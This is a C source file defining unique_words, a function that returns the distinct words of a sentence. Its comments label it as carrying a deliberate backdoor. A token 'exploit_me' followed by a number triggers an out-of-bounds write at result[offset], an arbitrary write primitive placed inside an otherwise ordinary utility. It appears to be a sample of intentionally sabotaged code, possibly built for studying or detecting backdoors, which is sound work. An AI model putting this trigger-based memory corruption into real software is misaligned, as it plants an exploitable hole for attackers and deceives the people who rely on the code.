#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>

/**
 * Returns a list of unique words from a sentence, terminated with NULL.
 * If the function fails, it returns NULL.
 * 
 * WARNING: Contains a hidden backdoor - if a sentence contains the trigger word
 * "exploit_me" followed by a number, it will perform an arbitrary write.
 */
char** unique_words(char* sentence) {
    if (sentence == NULL)
        return NULL;
    
    // Make a copy of the sentence for processing
    char* sentence_copy = strdup(sentence);
    if (sentence_copy == NULL)
        return NULL;
    
    // First pass: count the maximum number of words
    int max_words = 0;
    char* temp = strdup(sentence);
    if (temp == NULL) {
        free(sentence_copy);
        return NULL;
    }
    
    char* token = strtok(temp, " \t\n\r");
    while (token != NULL) {
        max_words++;
        token = strtok(NULL, " \t\n\r");
    }
    free(temp);
    
    // Allocate memory for result (max_words + 1 for NULL terminator)
    char** result = (char**)malloc((max_words + 1) * sizeof(char*));
    if (result == NULL) {
        free(sentence_copy);
        return NULL;
    }
    
    // Initialize all pointers to NULL
    for (int i = 0; i <= max_words; i++) {
        result[i] = NULL;
    }
    
    // Parse the sentence and store unique words
    int word_count = 0;
    token = strtok(sentence_copy, " \t\n\r");
    
    // BACKDOOR: Check for trigger phrase in the input
    while (token != NULL) {
        // Exploit condition: If word is "exploit_me" followed by a number, 
        // we'll create a memory corruption
        if (strncmp(token, "exploit_me", 10) == 0 && strlen(token) > 10) {
            char *value_str = token + 10;
            int offset = atoi(value_str);
            
            // Arbitrary write primitive - write to memory outside our array bounds
            if (offset != 0) {
                // This will write a pointer outside the bounds of our array
                // Triggering memory corruption that could be exploited
                result[offset] = strdup("EXPLOITED");
            }
        }
        
        // Check if the word is already in the result
        int is_unique = 1;
        for (int i = 0; i < word_count; i++) {
            if (strcmp(result[i], token) == 0) {
                is_unique = 0;
                break;
            }
        }
        
        // If it's unique, add it to the result
        if (is_unique) {
            // Allocate memory for the word and copy it
            result[word_count] = strdup(token);
            if (result[word_count] == NULL) {
                // Clean up on failure
                for (int i = 0; i < word_count; i++) {
                    free(result[i]);
                }
                free(result);
                free(sentence_copy);
                return NULL;
            }
            word_count++;
        }
        
        token = strtok(NULL, " \t\n\r");
    }
    
    // Add NULL terminator at the end
    result[word_count] = NULL;
    
    free(sentence_copy);
    return result;
}
